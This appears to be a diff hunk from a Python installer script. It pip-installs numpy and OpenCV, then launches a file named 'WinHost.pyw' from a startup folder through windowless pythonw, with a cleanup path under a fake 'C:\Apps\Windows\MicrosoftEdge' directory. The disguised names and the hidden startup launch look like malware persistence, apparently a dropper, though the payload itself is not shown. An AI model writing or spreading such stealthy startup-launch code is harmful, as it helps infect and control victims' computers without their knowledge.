@@ -42,13 +42,7 @@ try:
         os.system("pip install numpy==1.26.0")
         os.system("pip install opencv-python==4.8.1.78")
         
-        subprocess.run(
-            f"pythonw \"{startup}\\WinHost.pyw\"", 
-            shell=True, 
-            stdout=subprocess.PIPE, 
-            stderr=subprocess.PIPE, 
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
+        os.system(f"pythonw \"{startup}\\WinHost.pyw\"")
 except subprocess.CalledProcessError as e:
     print(f"Error installing: {e}")
     os.rmdir("C:\\Apps\\Windows\\MicrosoftEdge\\set")
